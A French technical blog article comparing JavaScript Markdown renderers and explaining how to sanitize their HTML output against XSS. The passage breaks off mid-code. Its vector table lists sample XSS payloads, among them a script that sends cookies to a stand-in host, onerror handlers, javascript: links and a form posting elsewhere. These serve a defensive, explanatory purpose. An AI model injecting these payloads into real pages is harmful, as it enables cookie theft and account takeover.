---
title: Rendre du Markdown en JavaScript sans livrer une faille avec
description: marked, markdown-it, unified, micromark et snarkdown comparés, avec le schéma rendre-puis-assainir qui empêche l’XSS de se glisser dans le HTML livré
updated: 2026-09-09
date: 2026-07-24
tag: Code
keywords: markdown vers html javascript, marked js, markdown-it, remark rehype, unified markdown, react markdown, comparatif parseur markdown, micromark, snarkdown, plugins markdown-it, rehype-sanitize, dompurify markdown, rendre markdown en streaming, html brut dans markdown
---

Trois bibliothèques font l’essentiel du travail de Markdown vers HTML en JavaScript, et elles
répondent à la même question : donnez-moi du Markdown, rendez-moi du HTML. Ce qui les distingue,
c’est la forme — ce que l’analyse expose et où l’on s’y raccroche. Puis vient la partie que la
plupart des tutoriels sautent : ce qui revient, c’est du HTML, et le poser dans une page n’est pas
sans danger.

Le choix se fait d’ordinaire en cinq minutes, à partir d’un résultat de recherche, et se vit ensuite
pendant quatre ans. Il cesse d’être bon marché le jour où quelqu’un réclame une table des matières,
ou que les liens externes s’ouvrent dans un nouvel onglet sans que les internes le fassent, ou
qu’un identifiant de titre corresponde à l’ancre qu’un article d’aide pointe déjà. À ce moment-là,
la question n’est plus de savoir quel analyseur est le plus rapide. Elle est de savoir si la
bibliothèque vous a donné quelque chose auquel vous raccrocher.

La seconde chose qui vieillit mal, c’est l’entrée. Un moteur de rendu pointé sur votre propre
documentation est un problème d’affichage. Le même moteur pointé sur un champ de commentaire, une
description de pull request, un fichier téléversé par un client ou la sortie d’un modèle de langage
est un problème de sécurité, et aucune de ces bibliothèques ne le résout à votre place — la plus
populaire d’entre elles le dit dans son propre README.

### En bref

Utilisez **marked** quand le travail consiste à faire entrer une chaîne et en ressortir une, et que
personnaliser signifie surcharger quelques méthodes du moteur de rendu. Utilisez **markdown-it**
quand vous voulez la conformité CommonMark plus un plugin pour chaque extension qu’on finira par vous
réclamer, et la possibilité de changer la sortie d’une seule balise sans toucher à l’analyse. Utilisez
**unified** — `remark-parse`, `remark-rehype`, `rehype-stringify` — quand vous avez besoin du document
sous forme d’arbre, car c’est la seule des trois où transformer le contenu n’est pas de la chirurgie
sur des chaînes de caractères. **micromark** est l’analyseur sous remark et n’est la bonne réponse
que si vous construisez la couche au-dessus ; **snarkdown** fait un kilo-octet et une série de
compromis. Quel que soit votre choix, assainissez le HTML ensuite avec un outil dont c’est l’unique
travail.

## Trois formes, une seule tâche

| Bibliothèque | Idéale pour | Position vis-à-vis de la spécification | Comment l’étendre | Dans un navigateur | Licence |
| --- | --- | --- | --- | --- | --- |
| marked | Une fonction, peu de rouages | GFM activé par défaut (`gfm: true`) ; pas de revendication formelle de conformité dans son README | `marked.use()` avec un renderer, un tokenizer, des extensions personnalisées, des hooks et `walkTokens` | Oui — navigateur, Node et un CLI, tous dans un seul paquet | Gratuit, MIT |
| markdown-it | Exactitude, et un plugin pour tout | Revendique 100 % de conformité CommonMark, avec un préréglage `commonmark` pour le mode strict | `.use(plugin)`, `.enable()` / `.disable()` par règle, et surcharge de `md.renderer.rules[name]` | Oui | Gratuit, MIT |
| unified (remark + rehype) | Transformer le document, pas seulement le rendre | CommonMark via micromark ; GFM ajouté par `remark-gfm` | Des plugins qui parcourent deux arbres syntaxiques, mdast pour le Markdown et hast pour le HTML | Oui, et ESM uniquement | Gratuit, MIT |
| micromark | Construire une couche d’analyseur, pas une application | Revendique 100 % de conformité CommonMark et c’est le moteur à l’intérieur de remark | Extensions de syntaxe et extensions HTML, écrites contre des codes de caractères et des tokens | Oui | Gratuit, MIT |
| snarkdown | Un kilo-octet, si l’on accepte ce que cela coûte | Aucune revendication de conformité ; les tableaux ne sont pas pris en charge | Pratiquement pas extensible — une seule fonction exportée | Oui | Gratuit, MIT |

(Licences, options et revendications de conformité vérifiées sur marked.js.org, github.com et
cdn.jsdelivr.net, le 9 septembre 2026. Il n’y a volontairement aucun chiffre de performance dans ce
tableau : la vitesse est ce que tout comparatif mesure et ce qui tranche le moins de ces choix.)

marked est la chose la plus simple qui fonctionne. Appelez `marked.parse()`, obtenez du HTML.
Personnaliser signifie remplacer des méthodes du moteur de rendu — celle qui produit un titre, celle
qui produit un lien — ou enregistrer une extension pour une nouvelle syntaxe. La plupart des tâches
n’atteignent jamais ce plafond.

markdown-it analyse vers un flux de tokens plat et rend ce flux. Les tokens sont documentés, l’écosystème
de plugins est donc vaste et les plugins se combinent : ancres, notes de bas de page, footnotes,
attributs, conteneurs. Pour changer la sortie plutôt que la syntaxe, on surcharge la règle d’un type
de token.

Le pipeline unified est différent par nature. `remark-parse` produit du mdast, un arbre syntaxique
Markdown ; `remark-rehype` le convertit en hast, un arbre HTML ; `rehype-stringify` l’imprime. Chaque
étape intermédiaire est un plugin qui parcourt un véritable arbre — la seule des trois où vous pouvez
collecter tous les titres, ou réécrire des chemins d’image relatifs, sans regex.

Deux autres méritent d’être connues, aux deux extrémités. micromark est l’analyseur sur lequel remark
est bâti : il lit le Markdown comme des codes de caractères et produit des tokens concrets avec leurs
positions, et revendique une conformité CommonMark totale. On l’utiliserait directement pour
construire un outil au-dessus du Markdown — un linter, un formateur, une coloration syntaxique pour
un éditeur — plutôt que pour rendre une page, car seul, il donne des tokens et un compilateur, pas un
document que l’on peut parcourir. snarkdown est à l’autre bout : une fonction unique pilotée par des
expressions régulières, décrite par son propre README comme 1 ko d’ES3 compressé, sans tableaux et
sans assainissement (vérifié sur github.com, le 9 septembre 2026). Elle existe pour un widget où tout
l’intérêt est que rien d’autre ne soit livré.

## Les bibliothèques en détail

### marked — les options qui comptent

L’API de marked tient en un appel et un objet d’options, et seule une poignée de ces options change
l’apparence du HTML.

| Option | Défaut | Ce qu’elle fait |
| --- | --- | --- |
| `gfm` | `true` | GitHub Flavored Markdown : tableaux, texte barré, listes de tâches, liens automatiques |
| `breaks` | `false` | Un simple retour à la ligne devient un `<br>`, comme se comporte un commentaire GitHub |
| `pedantic` | `false` | Suit le `markdown.pl` original, bogues compris, et abandonne le GFM pour y parvenir |
| `async` | `false` | `walkTokens` peut être asynchrone et `marked.parse()` renvoie une promesse |
| `silent` | `false` | Les erreurs reviennent comme une chaîne plutôt que de lever une exception |
| `renderer` | un `Renderer` | Les fonctions qui transforment chaque token en HTML |
| `tokenizer` | un `Tokenizer` | Les fonctions qui transforment le texte source en tokens |
| `walkTokens` | `null` | Appelée pour chaque token, les enfants avant les frères |

(Vérifié sur marked.js.org, le 9 septembre 2026.)

`breaks` est celle que les gens comprennent mal. La règle de Markdown veut qu’un simple retour à la
ligne soit une espace et qu’une ligne vide soit un paragraphe, ce qui convient pour de la prose et ne
convient pas à ce qui est tapé dans un champ de message, où une personne appuyant sur Entrée s’attend
à ce qu’une ligne se termine. Activer `breaks` est une décision sur vos utilisateurs, pas sur la
spécification. `pedantic` est un interrupteur de compatibilité pour des documents écrits contre
l’implémentation de 2004, et ce n’est pas ce qu’il faut pour quoi que ce soit écrit cette décennie.

Le piège le plus large, ce sont les options qui n’existent plus. marked a déplacé une longue liste de
comportements hors du cœur et vers des paquets séparés, un extrait copié d’une vieille réponse
transmettra donc une option silencieusement ignorée plutôt que rejetée.

| Option retirée | Où elle est allée |
| --- | --- |
| `sanitize`, `sanitizer` | Retirée au profit d’un vrai assainisseur : DOMPurify, sanitize-html ou insane |
| `highlight`, `langPrefix` | `marked-highlight` |
| `headerIds`, `headerPrefix` | `marked-gfm-heading-id` |
| `mangle` | `marked-mangle` |
| `smartypants` | `marked-smartypants` |
| `baseUrl` | `marked-base-url` |
| `xhtml` | `marked-xhtml` |

(Vérifié sur marked.js.org, le 9 septembre 2026.) La première ligne est la plus importante. Si votre
code passe `sanitize: true` et que vous croyez avoir là une défense, vous n’en avez aucune.

Personnaliser la sortie consiste à surcharger des méthodes du moteur de rendu. Chacune reçoit le
token et renvoie une chaîne, et `this.parser` est disponible pour rendre les enfants du token.

```js
import { marked } from 'marked';

const slug = (text) =>
  `doc-${text.toLowerCase().trim().replace(/[^\w]+/g, '-').replace(/^-|-$/g, '')}`;

marked.use({
  renderer: {
    heading({ tokens, depth }) {
      const text = this.parser.parseInline(tokens);
      return `<h${depth} id="${slug(text)}">${text}</h${depth}>\n`;
    },
  },
});
```

Le tokenizer relève de la même idée un cran plus tôt : surchargez la fonction qui reconnaît un
morceau de syntaxe, renvoyez `false` et marked retombe sur le comportement par défaut. Utilisez le
renderer pour changer la façon dont quelque chose est produit, et le tokenizer pour changer ce qui
compte comme cette chose au départ.

Pour une syntaxe que marked ne connaît pas, enregistrez une extension : un `name`, un `level` de
`block` ou `inline`, un `start` qui indique où le token peut commencer, un `tokenizer` qui le produit
et un `renderer` qui l’imprime. Les hooks se situent entièrement hors de l’analyse — `preprocess` voit
le Markdown avant la tokenisation, `postprocess` voit le HTML après, et `processAllTokens` voit tout
le tableau de tokens entre les deux. Un hook `preprocess` est l’endroit le plus propre pour retirer le
front matter YAML, qui sinon se rend comme un paragraphe de lignes `clé: valeur` en haut de la page.

La coloration syntaxique est désormais `marked-highlight`, qui enveloppe un outil de coloration de
votre choix et ajoute les noms de classe à l’élément `<code>`.

```js
import { Marked } from 'marked';
import { markedHighlight } from 'marked-highlight';
import hljs from 'highlight.js';

const marked = new Marked(
  markedHighlight({
    langPrefix: 'hljs language-',
    highlight(code, lang) {
      const language = hljs.getLanguage(lang) ? lang : 'plaintext';
      return hljs.highlight(code, { language }).value;
    },
  }),
);
```

Deux choses à remarquer. `langPrefix` vaut par défaut `language-`, une clôture `js` produit donc
`class="language-js"` — et la classe qu’attend votre feuille de style doit correspondre, ce qui est en
général la raison pour laquelle la coloration est appliquée sans se voir. Et le balisage que produit
l’outil de coloration, ce sont des éléments `<span>` avec des classes, que votre assainisseur doit
autoriser, sans quoi il retirera la coloration après que vous en ayez payé le prix. [Ce dont les blocs de code ont besoin sur la page](/blog/code-blocks-in-markdown) couvre le reste de ce
sujet. Les outils de coloration asynchrones fonctionnent si vous fixez `async: true` et attendez
l’analyse. (`marked-highlight` est gratuit et sous licence MIT ; son défaut `langPrefix` et sa prise
en charge de l’asynchrone vérifiés sur github.com, le 9 septembre 2026.)

marked est sous licence MIT, tourne dans un navigateur, dans Node et depuis son propre CLI, et son
README dit clairement qu’il n’assainit pas sa sortie (vérifié sur github.com, le 9 septembre 2026).

### markdown-it — préréglages, règles et écosystème de plugins

markdown-it analyse vers un flux de tokens plat et rend ce flux, et les deux moitiés sont ouvertes.
Il part d’un préréglage, et les préréglages diffèrent de façons qui comptent plus que leurs noms ne le
laissent penser.

| Préréglage | `html` | `maxNesting` | Règles activées |
| --- | --- | --- | --- |
| `'default'` (ou rien) | `false` | `100` | Tout ce que markdown-it implémente, tableaux et texte barré compris |
| `'commonmark'` | `true` | `20` | CommonMark strict, rien au-delà |
| `'zero'` | `false` | `20` | Paragraphes et texte seulement — vous activez le reste par son nom |

(Lu depuis les fichiers de préréglages sur cdn.jsdelivr.net, le 9 septembre 2026.)

Relisez la colonne du milieu. `new MarkdownIt('commonmark')` active le HTML brut, parce que la
spécification CommonMark dit que le HTML brut doit passer. Demander le préréglage le plus strict rend
votre moteur de rendu moins sûr, pas plus, ce qui est un résultat authentiquement surprenant à obtenir
en choisissant l’option qui semble la plus rigoureuse.

Le préréglage `zero` est l’inverse, et il est sous-utilisé. Il active `paragraph`, `text` et les
règles de jonction, et rien d’autre ; vous appelez ensuite `md.enable(['emphasis', 'link', 'backticks'])`
et vous obtenez un moteur de rendu qui ne peut prouvablement pas produire de titre ni de tableau. Pour
un nom d’affichage, un message de commit ou un champ de commentaire d’une ligne, c’est une bien
meilleure réponse qu’un analyseur complet suivi d’un assainisseur agressif.

Les options par-dessus un préréglage :

| Option | Défaut | Ce qu’elle fait |
| --- | --- | --- |
| `html` | `false` | Laisse passer le HTML brut plutôt que de l’échapper |
| `xhtmlOut` | `false` | Produit `<br />` plutôt que `<br>` |
| `breaks` | `false` | Un simple retour à la ligne devient un `<br>` |
| `langPrefix` | `'language-'` | Préfixe de classe sur les blocs de code délimités |
| `linkify` | `false` | Transforme les URL nues du texte en liens |
| `typographer` | `false` | Guillemets typographiques, tirets et autres substitutions |
| `quotes` | guillemets courbes | Quels caractères de guillemets `typographer` substitue |
| `highlight` | `null` | Une fonction qui renvoie du HTML coloré pour un bloc de code |
| `maxNesting` | `100` (`20` dans les préréglages stricts) | Limite de récursion, pour empêcher un document malveillant d’épuiser la pile |

(Défauts lus dans les mêmes fichiers de préréglages sur cdn.jsdelivr.net, le 9 septembre 2026.)

`linkify` est celle sur laquelle réfléchir avant de l’activer. Elle réécrit du texte que l’auteur n’a
pas balisé comme un lien, ce qui est pratique dans un message de discussion et faux dans une
documentation où `exemple.com/chemin` au milieu d’une phrase était fait pour être lu, pas cliqué.
`typographer` est similaire : elle change les caractères de votre texte, ce qui est charmant dans un
essai et destructeur dans un document où quelqu’un a tapé `--` parce que cela voulait dire quelque
chose. Aucune des deux n’est activée par défaut, et toutes deux méritent une décision plutôt qu’un
réglage par défaut.

`maxNesting` n’est pas cosmétique. Une emphase ou des citations profondément imbriquées sont une
entrée classique de déni de service pour un analyseur récursif, et une limite est ce qui empêche un
fichier de 4 Ko d’emporter un thread de requête avec lui.

L’écosystème de plugins est la vraie raison de choisir markdown-it. Son README pointe vers le mot-clé
`markdown-it-plugin` sur npm pour ceux écrits par la communauté (vérifié sur github.com, le
9 septembre 2026), et ils se combinent, car ils étendent tous la même chaîne de règles documentée :
notes de bas de page, listes de définitions, conteneurs (`::: warning`), attributs, ancres, table des
matières, listes de tâches, abréviations, emoji. Là où marked vous demande d’écrire une extension,
markdown-it en a généralement déjà une, et l’ajouter est un seul appel `.use()`. La qualité varie, et
un plugin non mis à jour depuis la dernière version majeure est un coût réel — à vérifier avant de
construire dessus.

Pour changer la sortie plutôt que la syntaxe, surchargez une règle du moteur de rendu. C’est le
schéma pour ajouter une classe ou un attribut, documenté sur la page d’architecture du projet
lui-même :

```js
const defaultRender = md.renderer.rules.link_open || function (tokens, idx, options, env, self) {
  return self.renderToken(tokens, idx, options);
};

md.renderer.rules.link_open = function (tokens, idx, options, env, self) {
  tokens[idx].attrSet('target', '_blank');
  tokens[idx].attrSet('rel', 'noopener noreferrer');
  return defaultRender(tokens, idx, options, env, self);
};
```

(Schéma tiré de la documentation d’architecture de markdown-it, vérifié sur github.com, le
9 septembre 2026 ; la ligne `rel` est l’ajout à faire si vous ouvrez un lien dans un nouvel onglet.)
Gardez la référence à la règle précédente et appelez-la. Surcharger sans repasser par elle est la
façon dont on perd l’attribut `title` sans jamais s’en apercevoir, parce que rien ne lève d’erreur —
l’attribut cesse simplement d’apparaître.

markdown-it est gratuit, sous licence MIT, et tourne dans un navigateur. La documentation de VS Code
dit elle-même que son aperçu Markdown vise CommonMark en utilisant markdown-it (vérifié sur
code.visualstudio.com, le 9 septembre 2026), ce qui est une bonne caution de sa conformité et la
raison pour laquelle un document qui s’affiche correctement dans votre éditeur est un bon signe et non
une garantie.

### unified — deux arbres et les plugins entre eux

Le pipeline unified n’est pas un analyseur doté de crochets. C’est une suite de petits paquets, chacun
transformant un arbre, et le comprendre suppose de comprendre qu’il y a deux arbres.

**mdast** est l’arbre Markdown. Ses nœuds sont les choses que possède Markdown : `heading`, `list`,
`listItem`, `link`, `image`, `code`, `blockquote`, `text`. **hast** est l’arbre HTML. Ses nœuds sont
`element`, `text` et `comment`, avec des noms de balises et des propriétés. Un titre en mdast a une
`depth` de 2 ; le même titre en hast est un `element` avec `tagName: 'h2'`. Tout ce que vous voulez
faire en termes *du document* — rassembler les titres, vérifier que chaque lien se résout, réécrire
des chemins d’image relatifs, exiger qu’une image ait un texte alternatif — relève de mdast. Tout ce
que vous voulez faire en termes *du balisage* — ajouter une classe, envelopper les tableaux dans un
conteneur défilant, ajouter `loading="lazy"` — relève de hast. Se tromper d’arbre est la raison la
plus fréquente pour laquelle un plugin unified résiste.

| Étape | Paquet | Ce qui en ressort |
| --- | --- | --- |
| Analyser | `remark-parse` | mdast |
| Étendre la syntaxe | `remark-gfm`, `remark-frontmatter`, `remark-math` | mdast |
| Transformer le contenu | votre propre plugin, `unist-util-visit` | mdast |
| Faire le pont | `remark-rehype` | hast — le HTML brut est abandonné sauf si vous passez `allowDangerousHtml` |
| Réanalyser le HTML intégré | `rehype-raw` | hast avec ce HTML comme de vrais nœuds |
| Assainir | `rehype-sanitize` | hast, filtré contre un schéma |
| Sérialiser | `rehype-stringify` | une chaîne HTML |

Un pipeline complet qui accepte le HTML brut et y survit ressemble à ceci :

```js
import { unified } from 'unified';
import remarkParse from 'remark-parse';
import remarkGfm from 'remark-gfm';
import remarkRehype from 'remark-rehype';
import rehypeRaw from 'rehype-raw';
import rehypeSanitize from 'rehype-sanitize';
import rehypeStringify from 'rehype-stringify';

const processor = unified()
  .use(remarkParse)
  .use(remarkGfm)
  .use(remarkRehype, { allowDangerousHtml: true })
  .use(rehypeRaw)
  .use(rehypeSanitize)
  .use(rehypeStringify);

const html = String(await processor.process(markdown));
```

L’ordre est tout le modèle de sécurité. `remark-rehype` abandonne le HTML brut par défaut, ce qui est
sûr et généralement pas ce que vous voulez ; `allowDangerousHtml` le garde comme nœud brut,
`rehype-raw` l’analyse en éléments réels comme le ferait un navigateur, et `rehype-sanitize` filtre
alors ces éléments contre un schéma. Le projet recommande lui-même de l’utiliser « après la dernière
chose dangereuse » (README de rehype-sanitize, vérifié sur github.com, le 9 septembre 2026) — placez
un plugin qui injecte du balisage après l’assainisseur, et vous l’avez placé hors de sa portée.
`rehype-sanitize` prend par défaut un schéma de style GitHub, un point de départ sensé et délibéré :
c’est l’ensemble de balises que GitHub lui-même a décidé d’autoriser dans un README.

`remark-gfm` ajoute cinq choses, et cela vaut la peine de les nommer, car chacune est un échec
silencieux précis en son absence : liens automatiques littéraux, notes de bas de page, texte barré,
tableaux et listes de tâches. Il est sous licence MIT, comme le reste (vérifié sur github.com, le
9 septembre 2026). Lesquelles de ces fonctions vos fichiers réclament est une question sur vos
fichiers, et les différences de dialecte qui se cachent derrière méritent d’être lues une fois.

La raison d’accepter toute cette machinerie tient dans le milieu du tableau. Un plugin est une
fonction qui renvoie un transformateur, et un transformateur reçoit l’arbre :

```js
import { visit } from 'unist-util-visit';

const rewriteRelativeImages = (base) => () => (tree) => {
  visit(tree, 'image', (node) => {
    if (!/^[a-z][a-z0-9+.-]*:|^\/\//i.test(node.url)) {
      node.url = new URL(node.url, base).href;
    }
  });
};
```

Cela tient en neuf lignes, c’est correct pour chaque image du document y compris celles à l’intérieur
du texte d’un lien et des cellules d’un tableau, et il n’existe aucune version équivalente dans marked
ou markdown-it qui n’implique pas soit d’intercepter une méthode du moteur de rendu nœud par nœud,
soit de faire tourner une expression régulière sur du HTML fini. Quand la tâche est « faire quelque
chose à chaque X du document », un arbre n’est pas une réponse plus lourde, c’est la seule réponse qui
ne finit pas par casser sur un cas auquel vous n’aviez pas pensé.

Les coûts sont réels et sont traités plus loin. L’un d’eux mérite d’être signalé ici : les paquets
unified déclarent être exclusivement ESM (vérifié sur github.com, le 9 septembre 2026), ce qui est un
blocage pur et simple dans un build CommonJS ancien incapable d’utiliser un `import()` dynamique.

### react-markdown — le pipeline, rendu comme des composants

En React, `react-markdown` s’appuie sur le pipeline unified et rend des éléments React plutôt qu’une
chaîne HTML, aucun `dangerouslySetInnerHTML` n’est donc impliqué. Son README déclare qu’il est sûr par
défaut et construit un DOM virtuel à partir de l’arbre syntaxique, pour que React ne corrige que ce
qui a changé (vérifié sur github.com, le 9 septembre 2026). Il est sous licence MIT.

```jsx
import Markdown from 'react-markdown';
import remarkGfm from 'remark-gfm';

<Markdown
  remarkPlugins={[remarkGfm]}
  components={{
    a: ({ href, children }) => <Link to={href}>{children}</Link>,
    code: CodeBlock,
  }}
>
  {text}
</Markdown>;
```

La prop `components` est celle qui justifie ce choix. Chaque élément HTML que le pipeline aurait
produit peut être remplacé par l’un des vôtres, un lien devient donc le lien de votre routeur, une
clôture de code devient votre bloc coloré avec un bouton de copie, et une image devient votre
composant d’image à chargement différé — sans générer de HTML pour ensuite le réanalyser.
`remarkPlugins` et `rehypePlugins` prennent les mêmes plugins que n’importe quel pipeline unified,
avec des options passées sous forme `[[plugin, options]]`.

Deux notes de sécurité, toutes deux tirées de la documentation du projet. Le HTML brut de la source
est ignoré sauf si vous ajoutez `rehype-raw`, et la consigne est de ne le faire que si vous faites
confiance au Markdown ; ajouter `rehype-sanitize` en plus est la réponse quand ce n’est pas le cas. Et
`urlTransform` — le crochet qui décide de ce que devient l’URL d’un lien ou d’une image — est le seul
endroit où l’on peut réintroduire une faille XSS dans un composant par ailleurs sûr, en le surchargeant
avec quelque chose qui laisse passer `javascript:`.

### MDX — une tout autre chose

MDX ressemble à l’étape suivante après react-markdown, et ce n’est pas du tout sur le même axe. MDX
est un format de fichier qui combine Markdown avec JSX et les instructions ESM `import` et `export`,
et qui se compile en un composant JavaScript (vérifié sur mdxjs.com, le 9 septembre 2026). La sortie
est du code.

Cette distinction décide de tout quant à sa place légitime. Un moteur de rendu Markdown prend du
texte à l’exécution et produit du balisage ; MDX prend un fichier source au moment du build et produit
un module qui s’exécute. L’assainissement n’est pas une étape d’un pipeline MDX parce qu’il n’y a rien
à assainir — le fichier a été autorisé à s’exécuter par conception. MDX est le bon outil pour de la
documentation et des pages marketing qui vivent dans votre dépôt et ont besoin de composants
interactifs à l’intérieur de la prose, ce qui explique pourquoi les frameworks de documentation s’en
saisissent — Docusaurus compile aussi bien `.md` que `.mdx` avec le compilateur MDX (vérifié sur
docusaurus.io, le 9 septembre 2026). C’est catégoriquement le mauvais outil pour tout contenu venant
d’un utilisateur, d’un client, d’une API ou d’un modèle. Si l’entrée n’est pas écrite par quelqu’un
ayant accès au dépôt, MDX n’entre pas en ligne de compte, et aucun réglage de configuration ne change
cette réponse.

## Laquelle est la meilleure réponse

La question qui les sépare n’est pas la vitesse, c’est de savoir si vous aurez un jour besoin du
document comme donnée. Pour du Markdown fiable rendu dans une page et rien d’autre, marked ou
markdown-it suffisent. Pour une table des matières, une vérification de liens ou toute transformation
dépendant de la structure, remark et rehype sont la bonne réponse, et les deux autres se transforment
en chirurgie sur des chaînes. Ce que coûte de se tromper dans l’autre sens fait l’objet d’une section
plus bas.

Leurs défauts diffèrent en matière de dialecte, ce qui se manifeste comme une sortie manquante, pas
comme une erreur. marked a le GitHub Flavored Markdown derrière une option `gfm`, activée par défaut.
markdown-it active tableaux et texte barré dans son préréglage par défaut mais laisse les listes de
tâches à un plugin. unified prend le tout de `remark-gfm`. Si un document arrive sans ses tableaux ou
ses listes de tâches, vérifiez d’abord le dialecte — voir [CommonMark, GFM et les dialectes](/blog/commonmark-gfm-and-the-flavours).

Dit comme une table de correspondance, car la plupart de ces décisions tiennent en une ligne :

| Ce que vous construisez | Choisissez |
| --- | --- |
| Un champ de commentaire, un aperçu, une bulle de discussion | marked, avec un assainisseur |
| Un README rendu dans votre propre application | marked ou markdown-it, celui déjà présent |
| Une chaîne de documentation qui ajoute ancres, conteneurs et notes | markdown-it, et ses plugins |
| Un champ d’une ligne : un nom d’affichage, un objet de commit | markdown-it avec le préréglage `zero` et trois règles activées |
| Une table des matières, une vérification de liens, un linting de style maison | unified, sur mdast |
| Réécrire des URL, ajouter des classes, envelopper des éléments | unified, sur hast |
| Une application React | react-markdown, avec `components` |
| De la prose avec des composants interactifs, écrite par votre propre équipe | MDX, au moment du build |
| Un widget où le poids du bundle est la contrainte | snarkdown, en connaissance de ce qu’il ne fait pas |
| Un linter ou un formateur sur le Markdown lui-même | micromark, ou mdast directement |

## La faille : analyser n’est pas assainir

Markdown autorise le HTML brut par conception, tout analyseur respectant la spécification laisse donc
passer `<img src=x onerror=alert(1)>` tel quel jusqu’à votre page. marked portait autrefois une option
`sanitize` ; elle a été dépréciée puis retirée au profit d’un assainisseur dédié. markdown-it a par
défaut `html: false`, ce qui ferme la porte la plus large, mais une destination de lien reste une
entrée contrôlée par l’attaquant.

Les trois bibliothèques adoptent trois positions à ce sujet, et aucune n’est « nous nous en
occupons » :

| | marked | markdown-it | unified (remark + rehype) |
| --- | --- | --- | --- |
| Sortie | Une chaîne HTML | Une chaîne HTML, via des tokens | Un arbre, sérialisé à la fin |
| HTML brut | Laissé passer | Échappé par défaut (`html: false`), laissé passer dans le préréglage `commonmark` | Abandonné sauf `allowDangerousHtml` et `rehype-raw` |
| Assainissement | Aucun | Aucun | `rehype-sanitize`, si vous l’ajoutez |
| Ce que dit le projet | Utilisez DOMPurify, sanitize-html ou insane sur le HTML de sortie | Rien n’est échappé une fois `html: true` fixé — et le préréglage `commonmark` le fixe | `allowDangerousHtml` est dangereux ; utilisez `rehype-sanitize` après |

Donc : rendez, puis assainissez avec un outil dont c’est l’unique travail, toujours dans cet ordre.

La raison pour laquelle cet ordre n’est pas négociable, c’est qu’assainir la source Markdown ne
fonctionne pas. Markdown a trop de façons d’écrire la même sortie — liens de référence, échappements
d’entités, liens automatiques, commentaires HTML —, un filtre sur la source n’est donc un filtre que
sur une seule orthographe. Le HTML est la seule représentation où ce que l’on décide n’est pas
ambigu, parce que c’est ce que le navigateur va réellement recevoir.

Ce qu’un assainisseur doit arrêter est une liste plus longue que ce que la plupart des gens gardent en
tête :

| Vecteur | À quoi cela ressemble | Ce qui l’arrête |
| --- | --- | --- |
| Élément script | `<script>fetch('//x/'+document.cookie)</script>` | `script` n’est pas sur la liste blanche des balises |
| Attribut gestionnaire d’événement | `<img src=x onerror=alert(1)>` | `on*` n’est pas sur la liste blanche des attributs |
| URL `javascript:` | `[cliquez ici](javascript:alert(1))` | Une liste blanche de schémas sur `href` et `src` |
| URL `data:` transportant du balisage | `<iframe src="data:text/html,<script>…">` | `iframe` désactivé ; liste blanche de schémas sur `src` |
| SVG avec script ou gestionnaires | `<svg><script>…</script></svg>` | SVG désactivé sauf besoin réel de SVG en ligne |
| Style en ligne et CSS qui va chercher des ressources | `<div style="background:url(//x)">` | Retirer `style`, garder `class` |
| Formulaire postant ailleurs | `<form action="//x"><input name=pw>` | `form`, `input`, `button` hors de la liste |
| `<base>` réécrivant chaque lien relatif | `<base href="//x/">` | `base` hors de la liste |
| `meta refresh` redirigeant la page | `<meta http-equiv=refresh content=…>` | `meta` hors de la liste |
| Pollution du DOM via `id` ou `name` | `<a id="config">` masquant une variable globale | Préfixer les identifiants, ou les retirer |
| Imbrication assez profonde pour épuiser la pile | Des centaines de citations imbriquées | Une limite de nidification de l’analyseur, avant l’assainisseur |

Le dossier complet en faveur d’une liste blanche plutôt que d’une liste noire est un sujet à part ; en
bref, une liste noire est une liste des attaques auxquelles quelqu’un a déjà pensé.

### Quel assainisseur, et où il a sa place

| Assainisseur | Tourne où | A besoin d’un DOM | Se configure avec | Licence |
| --- | --- | --- | --- | --- |
| DOMPurify | Navigateur nativement ; Node avec jsdom | Oui | `ALLOWED_TAGS`, `ALLOWED_ATTR`, `USE_PROFILES`, hooks | Gratuit, Apache-2.0 ou MPL-2.0 |
| sanitize-html | Node, et empaqueté pour le navigateur | Non — il analyse avec htmlparser2 | `allowedTags`, `allowedAttributes`, `allowedSchemes`, `transformTags` | Gratuit, MIT |
| rehype-sanitize | Partout où unified tourne | Non — il filtre hast | Un schéma, de style GitHub par défaut | Gratuit, MIT |

(Licences et options de configuration vérifiées sur github.com, le 9 septembre 2026. Le dépôt
autonome de sanitize-html a été archivé en février 2026 et le paquet a rejoint le monorepo
ApostropheCMS, ce qui vaut la peine d’être su avant de déposer un ticket sur l’ancien.)

Choisissez selon l’endroit où le code s’exécute, pas selon la réputation. DOMPurify est la bonne
réponse dans un navigateur, où il utilise l’analyseur du navigateur lui-même et voit donc exactement
ce que verra le navigateur — y compris la récupération alambiquée qu’un vrai analyseur applique à du
balisage cassé, là où un filtre par correspondance de chaînes échoue. Il a des hooks, et
`SANITIZE_NAMED_PROPS` contre la pollution du DOM. rehype-sanitize est la bonne réponse si vous avez
déjà un pipeline unified, car il filtre l’arbre en place et il n’existe jamais de moment où du HTML
non sûr existe sous forme de chaîne. sanitize-html est la bonne réponse quand vous avez besoin d’une
seule implémentation qui se comporte de façon identique dans Node et dans le navigateur, sans DOM
sous-jacent.

## Rendre, puis assainir, dans le navigateur

DOMPurify est le choix standard. Donnez-lui une liste blanche explicite plutôt que celle par défaut :
la liste blanche est le format de document que vous avez décidé de prendre en charge.

```js
import { marked } from 'marked';
import DOMPurify from 'dompurify';

export const ALLOWED_TAGS = [
  'h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'p', 'br', 'hr', 'strong', 'em', 'del',
  'ul', 'ol', 'li', 'blockquote', 'pre', 'code', 'table', 'thead', 'tbody',
  'tr', 'th', 'td', 'a', 'img', 'input',
];

export const ALLOWED_ATTR = [
  'href', 'src', 'alt', 'title', 'id', 'class', 'target', 'rel',
  'type', 'checked', 'disabled', 'colspan', 'rowspan',
];

export function render(markdown) {
  const html = marked.parse(markdown, { gfm: true });
  return DOMPurify.sanitize(html, { ALLOWED_TAGS, ALLOWED_ATTR });
}
```

Gardez les deux tableaux dans un seul module et exportez-les. Dès que le même document est rendu
ailleurs, ils doivent correspondre exactement.

### La même liste blanche côté serveur

DOMPurify a besoin d’un vrai DOM, et le serveur n’en a pas. Un substitut médiocre est pire que rien :
sans DOM utilisable, DOMPurify renvoie l’entrée inchangée plutôt que de lever une exception, balise
script comprise. Donnez-lui soit jsdom, soit utilisez un assainisseur qui analyse le HTML lui-même,
comme `xss`.

```js
import { marked } from 'marked';
import { FilterXSS } from 'xss';
import { ALLOWED_ATTR, ALLOWED_TAGS } from './allow-list.js';

const filter = new FilterXSS({
  whiteList: Object.fromEntries(ALLOWED_TAGS.map((tag) => [tag, [...ALLOWED_ATTR]])),
  stripIgnoreTag: true,
